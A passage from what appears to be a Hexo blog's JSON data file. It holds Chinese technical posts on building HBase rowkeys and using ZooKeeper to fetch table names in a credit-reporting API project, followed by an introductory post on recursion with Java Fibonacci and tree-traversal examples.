数据存储格式</h4><p>如图这是HBase中的某张表的格式。</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/database/hbase/hbase_database_01.png\" alt=\"Hbase1\"></p>\n<p> 字段意思 : <br></p>\n<ul>\n<li>rowkey</li>\n</ul>\n<p>行键，用来确定具体的某一行。</p>\n<ul>\n<li>family</li>\n</ul>\n<p>列簇，列簇将表切割成不同部分。字节数组。</p>\n<ul>\n<li>qualifier</li>\n</ul>\n<p>列，列属于列簇，列的数量没有限制，可以动态添加.字节数组。</p>\n<ul>\n<li>cell</li>\n</ul>\n<p>存储具体数据的单元 . 没有数据类型，字节数组的形式存储.<br><br>在HBase每个cell存储单元对同一份数据有多个版本，根据唯一的时间戳来<br>区分每个版本之间的差异，时间戳可以由HBase(在数据写入时自动)赋值，<br>此时时间戳是精确到毫秒的当前系统时间，也可以由自己显示指定，按照时<br>间戳倒序排序，最新的数据排在最前面。</p>\n<h4 id=\"1-2-从表中取数据\"><a href=\"#1-2-从表中取数据\" class=\"headerlink\" title=\"1.2 从表中取数据\"></a>1.2 从表中取数据</h4><p>由{rowkey，column(family + qualifier)，version}唯一确定的单元.<br><br>注意，列中包含了列簇和列簇下面具体的列.<br></p>\n<p>所以取数据一般流程为:<br><br>得到表名 –&gt; 得到rowkey –&gt; 根据column取得cell –&gt; 取出数据.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//table</span><br><span class=\"line\">Table table = connection.getTable(TableName.valueOf(tableName));</span><br><span class=\"line\"></span><br><span class=\"line\">//rowkey</span><br><span class=\"line\">byte[] rowkeyHash = Bytes.toBytes((short)(mobnol.hashCode() &amp; 0x7FFF));</span><br><span class=\"line\">byte[] key = Bytes.add(rowkeyHash, Bytes.toBytes(mobnol));</span><br><span class=\"line\">Get get = new Get(key);</span><br><span class=\"line\"></span><br><span class=\"line\">//value</span><br><span class=\"line\">Result result = table.get(get);</span><br><span class=\"line\">if (!result.isEmpty()) &#123;</span><br><span class=\"line\">  byte[] value = result.getValue(FAMILYNAME, QUALIFIER);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-整体流程\"><a href=\"#2-整体流程\" class=\"headerlink\" title=\"2.整体流程\"></a>2.整体流程</h3><p><img src=\"http://67.216.218.49:8000/file/blogs/others/zhengxinapi_02.png\" alt=\"zhengxinapi\"></p>\n<p>由上面可知，要获取数据，需先得到表名和rowkey,其实还需要column值，但是column固定为(f簇,q列),所以不需要再获取.</p>\n<h3 id=\"3-rowkey构造\"><a href=\"#3-rowkey构造\" class=\"headerlink\" title=\"3.rowkey构造\"></a>3.rowkey构造</h3><p>rowkey的构建规则与数据入库的规则有关。<br><br>征信项目现有三种类型的HBase库(主备库，信令库，交际圈库),具体在交接文档(征信接口列表—迁移后 20181212.xls)中有注明.</p>\n<ul>\n<li>主备库</li>\n</ul>\n<p>例子:<a href=\"https://code.bonc.com.cn/zhengXinApi/credit\" target=\"_blank\" rel=\"noopener\">https://code.bonc.com.cn/zhengXinApi/credit</a> (三要素验证,四档)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">byte[] rowkeyHash = Bytes.toBytes((short)(&quot;电话号码MD5&quot;.hashCode() &amp; 0x7FFF));</span><br><span class=\"line\">byte[] key = Bytes.add(rowkeyHash, Bytes.toBytes(&quot;电话号码MD5&quot;));</span><br><span class=\"line\">Get get = new Get(key);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>信令库</li>\n</ul>\n<p>例子:<a href=\"https://code.bonc.com.cn/zhengXinApi/query\" target=\"_blank\" rel=\"noopener\">https://code.bonc.com.cn/zhengXinApi/query</a>  (实时位置查询)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">byte[] phone_id = Bytes.copy(Bytes.toBytes(Long.parseLong(TelNo)), 3, 5);</span><br><span class=\"line\">byte[] phone_id_hash = Bytes.toBytes((short) (TelNo.hashCode() &amp; 0x7fff));</span><br><span class=\"line\">byte[] key = Bytes.add(phone_id_hash, phone_id);</span><br><span class=\"line\">Get get = new Get(key);</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>交际圈库</li>\n</ul>\n<p>例子:<a href=\"https://code.bonc.com.cn/zhengXinApi/amc_istopcontact\" target=\"_blank\" rel=\"noopener\">https://code.bonc.com.cn/zhengXinApi/amc_istopcontact</a> (是否联系人手机号验证，电信合作版)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">byte[] deice_number_hash = Bytes.toBytes((short)(device_Number.hashCode() &amp; 0x7FFF));</span><br><span class=\"line\">byte[] deice_number = Bytes.toBytes(device_Number);</span><br><span class=\"line\">byte[] oppose_number = Bytes.toBytes(oppose_Number);</span><br><span class=\"line\">byte[] key = Bytes.add(deice_number_hash, deice_number, oppose_number);</span><br><span class=\"line\">Scan s = new Scan();</span><br><span class=\"line\">s.setStartRow(Bytes.add(key, Bytes.toBytes(0)));</span><br><span class=\"line\">s.setStopRow(Bytes.add(key, Bytes.toBytes(999999999)));</span><br></pre></td></tr></table></figure>\n<p>这里是用的Scan<br><br>按指定rowkey获取唯一一条记录：get方法。<br><br>按指定条件获取一批记录：scan方法。</p>\n<h3 id=\"4-tableName获取\"><a href=\"#4-tableName获取\" class=\"headerlink\" title=\"4.tableName获取\"></a>4.tableName获取</h3><p>在这里先简单介绍下zookeeper.<br><br>具体的我没仔细看，这里是一篇详细介绍的文章: <a href=\"https://blog.csdn.net/guchuanyun111/article/details/52091318\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/guchuanyun111/article/details/52091318</a></p>\n<h4 id=\"4-1-Zookeeper简要了解\"><a href=\"#4-1-Zookeeper简要了解\" class=\"headerlink\" title=\"4.1 Zookeeper简要了解\"></a>4.1 Zookeeper简要了解</h4><p>ZooKeeper主要是为分布式系统提供一致性协调(Coordination)服务。简单讲就是，如果某个节点宕机后，Zookeeper会通过选举算法重新选出一个节点，保证它不会由于单一节点的故障而造成问题.<br></p>\n<p>Zookeeper中存储的数据为树形结构，其上的每一个节点称为znode<br><br><img src=\"http://67.216.218.49:8000/file/blogs/others/zhengxinapi_znode_01.jpg\" alt=\"znode\"></p>\n<p>如征信用户验证表名节点路径为<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;property name=&quot;zkTableNamePath&quot; value=&quot;/fengkong/table/user_check&quot; /&gt;</span><br></pre></td></tr></table></figure></p>\n<p>ZooKeeper中的Watch机制(观察者模式)：Client可以在某个ZNode上设置一个Watcher，来Watch该ZNode上的变化。如果该ZNode上有相应的变化，就会触发这个Watcher，把相应的事件通知给设置Watcher的Client。需要注意的是，ZooKeeper中的Watcher是一次性的，即触发一次就会被取消，如果想继续Watch的话，需要客户端重新设置Watcher。</p>\n<h4 id=\"4-2-征信接口中的Zookeeper使用\"><a href=\"#4-2-征信接口中的Zookeeper使用\" class=\"headerlink\" title=\"4.2 征信接口中的Zookeeper使用\"></a>4.2 征信接口中的Zookeeper使用</h4><h5 id=\"4-2-1-为什么要用zookeeper\"><a href=\"#4-2-1-为什么要用zookeeper\" class=\"headerlink\" title=\"4.2.1 为什么要用zookeeper\"></a>4.2.1 为什么要用zookeeper</h5><p>以前征信接口项目中的表名都是放在redis还是oracle中的。表名会定期更新<br><br>后来出现了机房网络割接，导致某个数据库不可用，导致接口不可用，所以将之切换到了zookeeper中，某个节点挂掉不会影响使用.</p>\n<h5 id=\"4-2-2-怎么用\"><a href=\"#4-2-2-怎么用\" class=\"headerlink\" title=\"4.2.2 怎么用\"></a>4.2.2 怎么用</h5><p>连接zk时，注册该节点为监控状态<br><br>public ZooKeeper(String connectString, int sessionTimeout, Watcher watcher) throws IOException{}<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public ZooKeeperConnection(String connectString, int sessionTimeOut, InitUtil initUtil) &#123;</span><br><span class=\"line\">       this.connectString = connectString;</span><br><span class=\"line\">       this.sessionTimeOut = sessionTimeOut;</span><br><span class=\"line\">       this.initUtil = initUtil;</span><br><span class=\"line\">       try &#123;</span><br><span class=\"line\">           //zk的连接是异步的，建立连接后会调用process方法。</span><br><span class=\"line\">           zooKeeper = new ZooKeeper(&quot;xx.xx.xx.xx:2181,xx.xx.xx.xx:2181,xx.xx.xx.xx8:2181&quot;, sessionTimeOut, this);</span><br><span class=\"line\">       &#125; catch (IOException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">           logger.error(&quot;zk创建失败,&quot; + e.toString());</span><br><span class=\"line\">       &#125; catch (NullPointerException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">           //logger.error(&quot;zk创建失败,connectString: &quot; + prop.getConnectString() + &quot;,sessionTimeOut: &quot; + prop.getSessionTimeOut() + &quot;,&quot; + e.toString());</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure></p>\n<p>从zk节点中获取表名,获取到数据时，重新注册为被监控状态.<br><br>public byte[] getData(String path, boolean watch, Stat stat) throws KeeperException, InterruptedException { }</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Override</span><br><span class=\"line\">public void process(WatchedEvent event) &#123;</span><br><span class=\"line\">   try &#123;</span><br><span class=\"line\">       //连接事件</span><br><span class=\"line\">       if (event.getType() == Event.EventType.None) &#123;</span><br><span class=\"line\">           logger.info(&quot;连接事件&quot;);</span><br><span class=\"line\">           //连接成功</span><br><span class=\"line\">           if (event.getState() == Event.KeeperState.SyncConnected) &#123;</span><br><span class=\"line\">               logger.info(&quot;建立连接&quot;);</span><br><span class=\"line\">               String tableName = new String(zooKeeper.getData(initUtil.getZkTableNamePath(),true,null));</span><br><span class=\"line\">               initUtil.setTableName(tableName);</span><br><span class=\"line\"></span><br><span class=\"line\">           &#125; else if (event.getState() == Event.KeeperState.Expired || event.getState() == Event.KeeperState.Disconnected) &#123;</span><br><span class=\"line\">               logger.info(event.getState() == Event.KeeperState.Expired ? &quot;客户端超时&quot; : &quot;客户端断开连接&quot;);</span><br><span class=\"line\">               try &#123;</span><br><span class=\"line\">                   if (zooKeeper != null) &#123;</span><br><span class=\"line\">                       try &#123;</span><br><span class=\"line\">                           zooKeeper.close();</span><br><span class=\"line\">                           zooKeeper = null;</span><br><span class=\"line\">                       &#125; catch (Exception e) &#123;</span><br><span class=\"line\">                           e.printStackTrace();</span><br><span class=\"line\">                           logger.error(&quot;zk状态:&quot; + zooKeeper.getState() + &quot;,&quot; + e.toString());</span><br><span class=\"line\">                       &#125;</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">                   zooKeeper = new ZooKeeper(connectString, sessionTimeOut, this);</span><br><span class=\"line\">               &#125; catch (IOException e) &#123;</span><br><span class=\"line\">                   e.printStackTrace();</span><br><span class=\"line\">                   logger.error(&quot;zk创建失败,&quot; + e.toString());</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125; else if (event.getType() == Event.EventType.NodeDataChanged) &#123;</span><br><span class=\"line\">           //todo 这里是单个路径发生变化，上面是启动时/重连时 对所有路径进行监听</span><br><span class=\"line\">           logger.info(&quot;节点值变化事件&quot;);</span><br><span class=\"line\">           String tableName = new String(zooKeeper.getData(initUtil.getZkTableNamePath(),true,null));</span><br><span class=\"line\">           initUtil.setTableName(tableName);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125; catch (KeeperException | InterruptedException e) &#123;</span><br><span class=\"line\">       e.printStackTrace();</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"5-数据获取\"><a href=\"#5-数据获取\" class=\"headerlink\" title=\"5.数据获取\"></a>5.数据获取</h3><p>在tableName 和 rowkey 已知后，就可以直接获取数据了。但是在主备库情况下，主库备库都需要查询，又因为确定了只有两个库，所以在这里直接new了两个线程，不用使用线程池。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public List&lt;String&gt; threadQuery(Get get,String tableName,String logInfo)&#123;</span><br><span class=\"line\">\tList&lt;HbaseQueryUserThread&gt; threadList = new ArrayList&lt;&gt;();</span><br><span class=\"line\">\tList&lt;String&gt; resultList = null;</span><br><span class=\"line\">\tfor (String zkroot : HBasePool.getZKROOT()) &#123;</span><br><span class=\"line\">\t\ttry &#123;</span><br><span class=\"line\">\t\t\tHbaseQueryUserThread thread = new HbaseQueryUserThread(get, HBasePool.getHConnection(zkroot), tableName, logInfo);</span><br><span class=\"line\">\t\t\tthread.setName(&quot;/hbase_zx&quot;.equals(zkroot) ? &quot;主库&quot; : &quot;备库&quot;);</span><br><span class=\"line\">\t\t\tthreadList.add(thread);</span><br><span class=\"line\">\t\t\tthread.start();</span><br><span class=\"line\">\t\t&#125; catch (IOException e) &#123;</span><br><span class=\"line\">\t\t\tSystem.out.println(&quot;hbase创建出错===================================&quot;);</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//完成计数</span><br><span class=\"line\">\tint finish = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\tw:while (finish != threadList.size()) &#123;</span><br><span class=\"line\">\t\t//重置完成计数</span><br><span class=\"line\">\t\tfinish = 0;</span><br><span class=\"line\">\t\ttry &#123;</span><br><span class=\"line\">\t\t\tThread.sleep(1);</span><br><span class=\"line\">\t\t&#125; catch (InterruptedException e) &#123;</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tfor (HbaseQueryUserThread t : threadList) &#123;</span><br><span class=\"line\">\t\t\t//System.out.println(t.getName() + &quot;线程状态：&quot; + t.getState());</span><br><span class=\"line\">\t\t\t//线程存活</span><br><span class=\"line\">\t\t\tif (!t.isAlive()) &#123;</span><br><span class=\"line\">\t\t\t\t//结束 标识增加</span><br><span class=\"line\">\t\t\t\tfinish++;</span><br><span class=\"line\">\t\t\t\t//赋值</span><br><span class=\"line\">\t\t\t\tresultList = t.getList();</span><br><span class=\"line\">\t\t\t\t//有结果</span><br><span class=\"line\">\t\t\t\tif (t.getList().size() &gt; 0)&#123;</span><br><span class=\"line\">\t\t\t\t\t//System.out.println(&quot;跳出for&quot;);</span><br><span class=\"line\">\t\t\t\t\t//中断其他线程</span><br><span class=\"line\">\t\t\t\t\tfor (HbaseQueryUserThread thread : threadList)&#123;</span><br><span class=\"line\">\t\t\t\t\t\tthread.interrupt();</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\t//跳出while循环</span><br><span class=\"line\">\t\t\t\t\tbreak w;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn resultList;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"_content":"","source":"_posts/tools/apt和dpkg了解.md","raw":"","slug":"tools/apt和dpkg了解","published":1,"date":"2019-10-23T09:17:57.289Z","updated":"2019-10-23T09:17:57.289Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321gr000e6dcphdgl5u6d","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"理解递归","date":"2019-08-20T15:08:34.000Z","_content":"\n对递归的理解总是不是很清晰。但是又非常重要，学习记录一下.\n\n## 1.经典例子Fibonacc\n\n斐波那契数列是指1，1，2，3，5，8，13，21…的一个数列，它的规律就是某一个数就是前面两个数的和.\n\n### (1)实现\n```\npublic class MyTest {\n\n    public int fibonacc(int n){\n        if(n == 0 || n == 1){\n            return 1;\n        }else {\n            //递归\n            return fibonacc(n-2) + fibonacc(n-1);\n        }\n    }\n\n    public static void main(String[] args){\n        System.out.println(new MyTest().fibonacc(4));\n    }\n}\n```\n\n### (2)流程\n\n```\n1.fi(4)\n2.  fi(3)                       +               fi(2)\n3.    fi(2)               +   fi(1)      +        fi(1) + fi(0)\n4.      fi(1) + fi(0)     +   return     +        return + return\n5.      return + return          +              return\n6.    return\n7.  return\n8.return\n```\n如上,当求fi(4)的时候，进入递归，求出fi(3),fi(2),fi(1);\n\n## 2.为什么要用递归？\n\n在适合的场景下，递归代码非常简洁清晰，描述问题易于理解。<br>\n\n但是，如果调用层数比较深，需要增加额外的堆栈处理（还有可能出现堆栈溢出的情况），比如参数传递需要压栈等操作，会对执行效率有一定影响。\n\n## 3.对于递归的理解\n\n### (1)通用结构\n\n```\nfunc(){\n  if(结束条件){\n    return;\n  }else{\n    //递归\n    func();\n  }\n}\n```\n递归存在一个终止条件，每次递归会越来越接近这个终止条件。\n\n### (2)理解\n\n递归类似于循环，有一个繁琐的操作，但是每一步之间有相似性，可以将之拆分为不同层次，循环处理，每个层次都会有自己的返回结果或者操作照成的影响。\n\n### (3)树的递归遍历\n```\n//中序 左中右\npublic void inOrder(TreeNode root){\n    if(root != null){\n        //遍历它的左下级节点\n        inOrder(root.left);\n        System.out.println(root.val);\n        //左节点完后，遍历右节点\n        inOrder(root.right);\n    }\n}\n\n//前序 中左右\npublic void beforeOrder(TreeNode root){\n    if(root != null){\n        System.out.println(root.val);\n        //遍历它的左下级节点\n        beforeOrderOrder(root.left);\n        //左节点完后，遍历右节点\n        beforeOrderOrder(root.right);\n    }\n}\n\n//后续 左右中\npublic void afterOrder(TreeNode root){\n    if(root != null){\n        //遍历它的左下级节点\n        afterOrder(root.left);\n        //左节点完后，遍历右节点\n        afterOrder(root.right);\n        System.out.println(root.val);\n    }\n}\n```\n\n以中序遍历为例: 从根节点开始。<br>\n![tree](http://67.216.218.49:8000/file/blogs/algorithm/tree02.png)<br>\n\n如图，要进行中序遍历：\n\n1.F.left -> B.left -> A.left(无)  return A<br>\n2.return B<br>\n3.B.right -> D.left -> C.left(无) return C<br>\n4.return D<br>\n5.D.right -> E.left(无) return E<br>\n.....\n\n可以看见，从根节点开始，先 从左节点开始，层层遍历(递归)，找到最左子节点.<br>\n然后会跳出当层循环(最下层),得到B<br>\n然后B查找其右节点，存在，则从右节点开始，查找左节点。<br>\n\n总结，一层遍历分为查找左节点(如果存在) -> 找到自己 -> 查找右节点(如果存在) 三步，所以这三步可以成为一个基本递归单位.\n\nroot == null 为其结束条件。\n","source":"_posts/algorithm/理解递归.md","raw":"---\ntitle: 理解递归\ndate: 2019-08-20 11:08:34\ntags: [algorithm]\n---\n\n对递归的理解总是不是很清晰。但是又非常重要，学习记录一下.\n\n## 1.经典例子Fibonacc\n\n斐波那契数列是指1，1，2，3，5，8，13，21…的一个数列，它的规律就是某一个数就是前面两个数的和.\n\n### (1)实现\n```\npublic class MyTest {\n\n    public int fibonacc(int n){\n        if(n == 0 || n == 1){\n            return 1;\n        }else {\n            //递归\n            return fibonacc(n-2) + fibonacc(n-1);\n        }\n    }\n\n    public static void main(String[] args){\n        System.out.println(new MyTest().fibonacc(4));\n    }\n}\n```\n\n### (2)流程\n\n```\n1.fi(4)\n2.  fi(3)                       +               fi(2)\n3.    fi(2)               +   fi(1)      +        fi(1) + fi(0)\n4.      fi(1) + fi(0)     +   return     +        return + return\n5.      return + return          +              return\n6.    return\n7.  return\n8.return\n```\n如上,当求fi(4)的时候，进入递归，求出fi(3),fi(2),fi(1);\n\n## 2.为什么要用递归？\n\n在适合的场景下，递归代码非常简洁清晰，描述问题易于理解。<br>\n\n但是，如果调用层数比较深，需要增加额外的堆栈处理（还有可能出现堆栈溢出的情况），比如参数传递需要压栈等操作，会对执行效率有一定影响。\n\n## 3.对于递归的理解\n\n### (1)通用结构\n\n```\nfunc(){\n  if(结束条件){\n    return;\n  }else{\n    //递归\n    func();\n  }\n}\n```\n递归存在一个终止条件，每次递归会越来越接近这个终止条件。\n\n### (2)理解\n\n递归类似于循环，有一个繁琐的操作，但是每一步之间有相似性，可以将之拆分为不同层次，循环处理，每个层次都会有自己的返回结果或者操作照成的影响。\n\n### (3)树的递归遍历\n```\n//中序 左中右\npublic void inOrder(TreeNode root){\n    if(root != null){\n        //遍历它的左下级节点\n        inOrder(root.left);\n        System.out.println(root.val);\n        //左节点完后，遍历右节点\n        inOrder(root.right);\n    }\n}\n\n//前序 中左右\npublic void beforeOrder(TreeNode root){\n    if(root != null){\n        System.out.println(root.val);\n        //遍历它的左下级节点\n        beforeOrderOrder(root.left);\n        //左节点完后，遍历右节点\n        beforeOrderOrder(root.right);\n    }\n}\n\n//后续 左右中\npublic void afterOrder(TreeNode root){\n    if(root != null){\n        //遍历它的左下级节点\n        afterOrder(root.left);\n        //左节点完后，遍历右节点\n        afterOrder(root.right);\n        System.out.println(root.val);\n    }\n}\n```\n\n以中序遍历为例: 从根节点开始。<br>\n![tree](http://67.216.218.49:8000/file/blogs/algorithm/tree02.png)<br>\n\n如图，要进行中序遍历：\n\n1.F.left -> B.left -> A.left(无)  return A<br>\n2.return B<br>\n3.B.right -> D.left -> C.left(无) return C<br>\n4.return D<br>\n5.D.right -> E.left(无) return E<br>\n.....\n\n可以看见，从根节点开始，先 从左节点开始，层层遍历(递归)，找到最左子节点.<br>\n然后会跳出当层循环(最下层),得到B<br>\n然后B查找其右节点，存在，则从右节点开始，查找左节点。<br>\n\n总结，一层遍历分为查找左节点(如果存在) -> 找到自己 -> 查找右节点(如果存在) 三步，所以这三步可以成为一个基本递归单位.\n\nroot == null 为其结束条件。\n","slug":"algorithm/理解递归","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321h8000g6dcp6tk4sh86","content":"<p>对递归的理解总是不是很清晰。但是又非常重要，学习记录一下.</p>\n<h2 id=\"1-经典例子Fibonacc\"><a href=\"#1-经典例子Fibonacc\" class=\"headerlink\" title=\"1.经典例子Fibonacc\"></a>1.经典例子Fibonacc</h2><p>斐波那契数列是指1，1，2，3，5，8，13，21…的一个数列，它的规律就是某一个数就是前面两个数的和.</p>\n<h3 id=\"1-实现\"><a href=\"#1-实现\" class=\"headerlink\" title=\"(1)实现\"></a>(1)实现</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MyTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public int fibonacc(int n)&#123;</span><br><span class=\"line\">        if(n == 0 || n == 1)&#123;</span><br><span class=\"line\">            return 1;</span><br><span class=\"line\">        &#125;else &#123;</span><br><span class=\"line\">            //递归</span><br><span class=\"line\">            return fibonacc(n-2) + fibonacc(n-1);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        System.out.println(new MyTest().fibonacc(4));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-流程\"><a href=\"#2-流程\" class=\"headerlink\" title=\"(2)流程\"></a>(2)流程</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.fi(4)</span><br><span class=\"line\">2.  fi(3)                       +               fi(2)</span><br><span class=\"line\">3.    fi(2)               +   fi(1)      +        fi(1) + fi(0)</span><br><span class=\"line\">4.      fi(1) + fi(0)     +   return     +        return + return</span><br><span class=\"line\">5.      return + return          +              return</span><br><span class=\"line\">6.    return</span><br><span class=\"line\">7.  return</span><br><span class=\"line\">8.return</span><br></pre></td></tr></table></figure>\n<p>如上,当求fi(4)的时候，进入递归，求出fi(3),fi(2),fi(1);</p>\n<h2 id=\"2-为什么要用递归？\"><a href=\"#2-为什么要用递归？\" class=\"headerlink\" title=\"2.为什么要用递归？\"></a>2.为什么要用递归？</h2><p>在适合的场景下，递归代码非常简洁清晰，描述问题易于理解。<br></p>\n<p>但是，如果调用层数比较深，需要增加额外的堆栈处理（还有可能出现堆栈溢出的情况），比如参数传递需要压栈等操作，会对执行效率有一定影响。</p>\n<h2 id=\"3-对于递归的理解\"><a href=\"#3-对于递归的理解\" class=\"headerlink\" title=\"3.对于递归的理解\"></a>3.对于递归的理解</h2><h3 id=\"1-通用结构\"><a href=\"#1-通用结构\" class=\"headerlink\" title=\"(1)通用结构\"></a>(1)通用结构</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func()&#123;</span><br><span class=\"line\">  if(结束条件)&#123;</span><br><span class=\"line\">    return;</span><br><span class=\"line\">  &#125;else&#123;</span><br><span class=\"line\">    //递归</span><br><span class=\"line\">    func();</span><br><span class=\"line\">  &#125;</span><br><span 